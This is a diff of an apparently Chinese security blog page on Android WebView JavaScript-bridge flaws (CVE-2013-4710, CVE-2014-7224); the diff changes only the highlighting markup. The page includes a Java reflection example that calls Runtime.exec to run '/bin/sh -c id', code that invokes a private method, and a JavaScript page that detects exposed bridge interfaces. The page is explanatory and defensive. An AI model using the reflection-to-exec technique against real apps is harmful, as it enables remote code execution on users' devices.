 <h3 id="Java-Reflection"><a href="#Java-Reflection" class="headerlink" title="Java Reflection"></a>Java Reflection</h3><p>  反射是java语言提供的一种机制，使Java程序可以在运行时检查类、接口、方法和成员，<br>而不需要在编译的时候知道类的名字和方法等细节信息。</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-keyword">package</span> Reflect;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo</span> &#123;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">a1</span><span class="hljs-params">()</span> &#123;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">a2</span><span class="hljs-params">()</span> &#123;<br>&#125;<br><br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">hello</span> &#123;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>    Demo demo=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Demo</span>();<br>    <span class="hljs-type">Class</span> <span class="hljs-variable">mObjectClass</span> <span class="hljs-operator">=</span> demo.getClass();<br><br>    System.out.println(mObjectClass.getName());<br><br>    Method[] methods = mObjectClass.getMethods();<br>    <span class="hljs-keyword">for</span>(Method method : methods)&#123;<br>        System.out.println(<span class="hljs-string">&quot;method = &quot;</span> + method.getName());<br>    &#125;<br><br>    <span class="hljs-keyword">try</span> &#123;<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> mObjectClass.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> c.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>);<br>        m.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> m.invoke(<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c2</span> <span class="hljs-operator">=</span> obj.getClass();<br>        String[] array = &#123;<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;id &gt; /tmp/id&quot;</span>&#125;;<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">n</span> <span class="hljs-operator">=</span> c2.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, array.getClass());<br>        n.invoke(obj, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;array&#125;);<br><br>    &#125; <span class="hljs-keyword">catch</span> (Throwable e) &#123;<br>        System.out.println(e.toString());<br>    &#125;<br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> Reflect;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">a1</span><span class="params">()</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">a2</span><span class="params">()</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">hello</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">    Demo demo=<span class="keyword">new</span> <span class="title class_">Demo</span>();</span><br><span class="line">    <span class="type">Class</span> <span class="variable">mObjectClass</span> <span class="operator">=</span> demo.getClass();</span><br><span class="line"></span><br><span class="line">    System.out.println(mObjectClass.getName());</span><br><span class="line"></span><br><span class="line">    Method[] methods = mObjectClass.getMethods();</span><br><span class="line">    <span class="keyword">for</span>(Method method : methods)&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;method = &quot;</span> + method.getName());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> mObjectClass.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        m.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> m.invoke(<span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c2</span> <span class="operator">=</span> obj.getClass();</span><br><span class="line">        String[] array = &#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;id &gt; /tmp/id&quot;</span>&#125;;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">n</span> <span class="operator">=</span> c2.getMethod(<span class="string">&quot;exec&quot;</span>, array.getClass());</span><br><span class="line">        n.invoke(obj, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;array&#125;);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">        System.out.println(e.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>运行结果:</p>
-<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs abnf">&gt; javac -d . Reflect/hello.java<br>&gt; java Reflect.hello<br><br>Reflect.Demo<br><span class="hljs-attribute">method</span> <span class="hljs-operator">=</span> a2<br><span class="hljs-attribute">method</span> <span class="hljs-operator">=</span> a1<br><span class="hljs-attribute">method</span> <span class="hljs-operator">=</span> wait<br><span class="hljs-attribute">method</span> <span class="hljs-operator">=</span> wait<br><span class="hljs-attribute">method</span> <span class="hljs-operator">=</span> wait<br><span class="hljs-attribute">method</span> <span class="hljs-operator">=</span> equals<br><span class="hljs-attribute">method</span> <span class="hljs-operator">=</span> toString<br><span class="hljs-attribute">method</span> <span class="hljs-operator">=</span> hashCode<br><span class="hljs-attribute">method</span> <span class="hljs-operator">=</span> getClass<br><span class="hljs-attribute">method</span> <span class="hljs-operator">=</span> notify<br><span class="hljs-attribute">method</span> <span class="hljs-operator">=</span> notifyAll<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&gt; javac -d . Reflect/hello.java</span><br><span class="line">&gt; java Reflect.hello</span><br><span class="line"></span><br><span class="line">Reflect.Demo</span><br><span class="line">method = a2</span><br><span class="line">method = a1</span><br><span class="line">method = wait</span><br><span class="line">method = wait</span><br><span class="line">method = wait</span><br><span class="line">method = equals</span><br><span class="line">method = toString</span><br><span class="line">method = hashCode</span><br><span class="line">method = getClass</span><br><span class="line">method = notify</span><br><span class="line">method = notifyAll</span><br></pre></td></tr></table></figure>
 
 <p>命令执行成功。</p>
-<h3 id="通过reflection-访问private"><a href="#通过reflection-访问private" class="headerlink" title="通过reflection 访问private"></a>通过reflection 访问private</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-keyword">package</span> Reflect;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo</span> &#123;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">a1</span><span class="hljs-params">()</span> &#123;<br>    System.out.println(<span class="hljs-string">&quot;I am a1&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">a2</span><span class="hljs-params">()</span> &#123;<br>    System.out.println(<span class="hljs-string">&quot;I am a2&quot;</span>);<br>&#125;<br><br>&#125;<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">hello</span> &#123;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>    Demo demo=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Demo</span>();<br>    <span class="hljs-type">Class</span> <span class="hljs-variable">mObjectClass</span> <span class="hljs-operator">=</span> demo.getClass();<br><br>    System.out.println(mObjectClass.getName());<br><br>    Method[] methods = mObjectClass.getDeclaredMethods();<br>    <span class="hljs-keyword">for</span>(Method method : methods)&#123;<br>        System.out.println(<span class="hljs-string">&quot;method = &quot;</span> + method.getName());<br>    &#125;<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> mObjectClass.newInstance();<br>        methods[<span class="hljs-number">0</span>].setAccessible(<span class="hljs-literal">true</span>);<br>        methods[<span class="hljs-number">0</span>].invoke(o);<br>    &#125; <span class="hljs-keyword">catch</span> (Throwable e) &#123;<br>    &#125;<br>&#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure>
+<h3 id="通过reflection-访问private"><a href="#通过reflection-访问private" class="headerlink" title="通过reflection 访问private"></a>通过reflection 访问private</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> Reflect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">a1</span><span class="params">()</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;I am a1&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">a2</span><span class="params">()</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;I am a2&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">hello</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">    Demo demo=<span class="keyword">new</span> <span class="title class_">Demo</span>();</span><br><span class="line">    <span class="type">Class</span> <span class="variable">mObjectClass</span> <span class="operator">=</span> demo.getClass();</span><br><span class="line"></span><br><span class="line">    System.out.println(mObjectClass.getName());</span><br><span class="line"></span><br><span class="line">    Method[] methods = mObjectClass.getDeclaredMethods();</span><br><span class="line">    <span class="keyword">for</span>(Method method : methods)&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;method = &quot;</span> + method.getName());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> mObjectClass.newInstance();</span><br><span class="line">        methods[<span class="number">0</span>].setAccessible(<span class="literal">true</span>);</span><br><span class="line">        methods[<span class="number">0</span>].invoke(o);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p>运行结果：</p>
-<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">&gt; javac -d . Reflect/hello.java<br>&gt; java Reflect.hello<br><br>Reflect.Demo<br><span class="hljs-keyword">method</span> = <span class="hljs-title function_">a1</span><br><span class="hljs-title function_">method</span> = <span class="hljs-title function_">a2</span><br><span class="hljs-title function_">I</span> <span class="hljs-title function_">am</span> <span class="hljs-title function_">a1</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt; javac -d . Reflect/hello.java</span><br><span class="line">&gt; java Reflect.hello</span><br><span class="line"></span><br><span class="line">Reflect.Demo</span><br><span class="line">method = a1</span><br><span class="line">method = a2</span><br><span class="line">I am a1</span><br></pre></td></tr></table></figure>
 
 <p>已经成功调用了Demo的private a1 方法</p>
 <h2 id="☆-相关漏洞"><a href="#☆-相关漏洞" class="headerlink" title="☆  相关漏洞"></a>☆  相关漏洞</h2><h3 id="CVE-2013-4710"><a href="#CVE-2013-4710" class="headerlink" title="CVE-2013-4710"></a>CVE-2013-4710</h3><p>Disney Mobile、eAccess、KDDI、NTT DOCOMO、SoftBank设备上的Android 3.0至4.1.x版<br>本中存在安全漏洞，该漏洞源于程序没有正确实现WebView类。远程攻击者可借助特制的网<br>页利用该漏洞执行任意Java对象的方法或造成拒绝服务（重启）</p>
@@ -342,19 +195,19 @@
 <h3 id="CVE-2014-7224"><a href="#CVE-2014-7224" class="headerlink" title="CVE-2014-7224"></a>CVE-2014-7224</h3><p>根据 android&#x2F;webkit&#x2F;AccessibilityInjector.java 代码中的介绍，发现当系统辅助<br>功能中的任意一项服务被开启后，所有由系统提供的WebView都会被加入两个JS objects，<br>分别为是”accessibility”  和 “accessibilityTraversal”。如果APP使用了系统的WebView<br>并且设置了setJavaScriptEnabled()，那么恶意攻击者就可以使用”accessibility” 和<br>“accessibilityTraversal” 这两个Java Bridge来执行远程攻击代码</p>
 <h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>   这些CVE中最核心的是CVE-2012-6636, 出现的问题是接口定义问题。是非常经典的<br>do a 变成 do b 的例子，后面的修复方法也是保证了do a 就是 do a。</p>
 <h2 id="☆-漏洞检测"><a href="#☆-漏洞检测" class="headerlink" title="☆ 漏洞检测"></a>☆ 漏洞检测</h2><p>   使用WebView访问下面页面，输出的接口名称则存在漏洞。</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>WebView漏洞检测<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0,</span></span><br><span class="hljs-string"><span class="hljs-tag">maximum-scale=1.0, user-scalable=0&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>如果当前app存在漏洞，将会在页面中输出存在漏洞的接口方便程序员做出修改：<span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">check</span>(<span class="hljs-params"></span>)</span><br><span class="language-javascript">&#123;</span><br><span class="language-javascript">    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> obj <span class="hljs-keyword">in</span> <span class="hljs-variable language_">window</span>) </span><br><span class="language-javascript">    &#123;</span><br><span class="language-javascript">        <span class="hljs-keyword">try</span> &#123;</span><br><span class="language-javascript">            <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;getClass&quot;</span> <span class="hljs-keyword">in</span> <span class="hljs-variable language_">window</span>[obj]) &#123;</span><br><span class="language-javascript">                <span class="hljs-keyword">try</span>&#123;</span><br><span class="language-javascript">                    <span class="hljs-variable language_">window</span>[obj].<span class="hljs-title function_">getClass</span>();</span><br><span class="language-javascript">                    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(<span class="hljs-string">&#x27;&lt;span style=&quot;color:red&quot;&gt;&#x27;</span>+obj+<span class="hljs-string">&#x27;&lt;/span&gt;&#x27;</span>);</span><br><span class="language-javascript">                    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(<span class="hljs-string">&#x27;&lt;br /&gt;&#x27;</span>);</span><br><span class="language-javascript">                &#125;<span class="hljs-keyword">catch</span>(e)&#123;</span><br><span class="language-javascript">                &#125;</span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125; <span class="hljs-keyword">catch</span>(e) &#123;</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"><span class="hljs-title function_">check</span>();</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>WebView漏洞检测<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0,</span></span></span><br><span class="line"><span class="string"><span class="tag">maximum-scale=1.0, user-scalable=0&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">b</span>&gt;</span>如果当前app存在漏洞，将会在页面中输出存在漏洞的接口方便程序员做出修改：<span class="tag">&lt;/<span class="name">b</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">check</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="language-javascript">&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">for</span> (<span class="keyword">var</span> obj <span class="keyword">in</span> <span class="variable language_">window</span>) </span></span><br><span class="line"><span class="language-javascript">    &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">try</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (<span class="string">&quot;getClass&quot;</span> <span class="keyword">in</span> <span class="variable language_">window</span>[obj]) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">try</span>&#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="variable language_">window</span>[obj].<span class="title function_">getClass</span>();</span></span><br><span class="line"><span class="language-javascript">                    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;&lt;span style=&quot;color:red&quot;&gt;&#x27;</span>+obj+<span class="string">&#x27;&lt;/span&gt;&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">                    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;&lt;br /&gt;&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">                &#125;<span class="keyword">catch</span>(e)&#123;</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125; <span class="keyword">catch</span>(e) &#123;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"><span class="title function_">check</span>();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
 
 <p>   现代浏览器都实现基本一致的BOM，使得JavaScript和浏览器进行消息传递。<br>   是否有getClass的方法，可以作为检测WebView漏洞依据。</p>
 <p>   在Android 4.1.1 原生系统上测试，在默认配置下，存在 searchBoxJavaBridge_<br>   可以利用，CVE-2014-7224上的两个接口，并没有成功暴露。看了源代码后发现必须<br>   打开Accessibility 设置中的Enhance Web accessibility 才会暴露这个两个接口，<br>   因此CVE-2014-7224的影响并不像想象中的那么大。</p>
